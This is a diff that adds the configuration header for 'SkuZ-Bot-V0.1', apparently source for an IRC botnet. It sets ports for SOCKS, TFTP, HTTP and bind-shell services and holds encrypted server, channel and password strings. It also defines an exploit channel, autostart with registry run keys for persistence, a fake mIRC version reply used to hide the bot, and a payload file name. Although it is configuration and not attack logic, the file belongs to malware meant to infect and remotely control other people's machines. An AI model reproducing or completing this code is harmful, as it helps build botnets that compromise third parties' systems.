@@ -1,0 +1,89 @@
+/////////////////////////////////////////////////
+//       SkuZ-Bot-V0.1    By Skonk & BuZ       //
+/////////////////////////////////////////////////
+
+// NICK SETTINGS
+int maxrand = 5;
+BOOL nickprefix = TRUE;
+int nicktype = CONSTNICK;
+
+
+// PORTS 
+int port = 21881;
+int port2 = 21881;
+int socks4port = 1243;
+int tftpport = 69;
+int httpport = 2001;
+int rloginport = 513;
+int bindport = 3169;
+
+// MISC. SETTINGS
+BOOL topiccmd = TRUE;
+BOOL rndfilename = FALSE;
+BOOL AutoStart = TRUE;
+
+
+// BOT PREFIX
+char prefix = '.';
+
+
+#ifdef NO_CRYPT
+
+// SERVER SETTINGS
+char server[] = "\x16\x1D\xCA\x0A\x49\xD2\xE2\x7F\xAC\x3E\x4A\x84\x1F\x37\x96";
+char serverpass[] = "\x51\x5E\x98\x45\x15";
+char channel[] = "\x07\x78\x9F\x57\x2F\xD3\xF4";
+char chanpass[] = "";
+char server2[] = "\x16\x1D\xCA\x0A\x49\xD2\xE2\x7F\xAC\x3E\x4A\x84\x1F\x37\x96";
+char channel2[] = "\x07\x78\x9F\x57\x2F\xD3\xF4";
+char chanpass2[] = "";
+
+
+char nickconst[] = "\x6A\x49\xAE";
+
+
+// LOGIN PASSWORD
+char password[] = "\x4C\x4D\x88\x40\x18\x8D\xA5\x34";
+
+
+// BOT FILENAME SETTINGS
+char filename[] = "\x73\x45\x94\x63\x0E\x83\xA5\x35\xB3\x69\x06\xCF";
+char szLocalPayloadFile[]="skuz.dat";
+char logfile[]="c:\\skuz.txt";
+
+
+// BOT CONFIGURATION
+char botid[] = "skuz";
+char version[] = "skuz";
+char modeonconn[] = "";
+char chanmode[] = "";
+
+
+// EXPLOIT CHANNEL
+char exploitchan[] = "\x07\x78\x9F\x57\x2F\xD3\xF4";
+
+
+// MASTER HOST
+char *authost[] = {
+	"*!*@*.*"
+};
+
+
+// FAKE VERSION LIST
+char *versionlist[] = {
+	"Mirc"
+};
+	
+
+// REGISTRY SETTINGS
+char valuename[] = "\x69\x45\x99\x56\x14\x91\xB8\x37\xE9";
+char regkey1[]="\x77\x43\x9C\x50\x0C\x83\xA5\x34\xC1\x50\x33\xC3\x4D\x76\xC0\xBB\xD0\x89\x72\xFB\xF1\x89\xE5\x29\xA9\x3A\xAC\x82\xA4\x4D\x52\xE9\x84\xAD\xD1\xB2\x87\xCE\x96\xA4\x03\xA0\xA1\x5F\x68\x94\x38\xF3\x93";
+char regkey2[]="\x77\x43\x9C\x50\x0C\x83\xA5\x34\xC1\x50\x33\xC3\x4D\x76\xC0\xBB\xD0\x89\x72\xFB\xF1\x89\xE5\x29\xA9\x3A\xAC\x82\xA4\x4D\x52\xE9\x84\xAD\xD1\xB2\x87\xCE\x96\xA4\x03\xA0\xA1\x5F\x68\x94\x38\xF3\x93\xA8\x34\xC2\x71\xDD\xFE\x98\xC9";
+char regkey3[]="\x77\x43\x9C\x50\x0C\x83\xA5\x34\xC1\x50\x33\xC3\x4D\x76\xC0\xBB\xD0\x89\x72\xFB\xF1\x91\xC0\x02";
+char regkey4[]="\x77\x75\xA9\x70\x3E\xAF\x8B\x0D\xDE\x79\x0C\xD8\x4B\x6A\xDB\x8B\xD0\x81\x72\xD5\xC2\xB2\xDF\x22\xB9\x09\x87\xB2\x97\x7F\x65\xEE\x99\xB3\xE8\x80\xBF\xEB\x92";
+
+
+#endif
+/////////////////////////////////////////////////
+//       SkuZ-Bot-V0.1    By Skonk & BuZ       //
+/////////////////////////////////////////////////
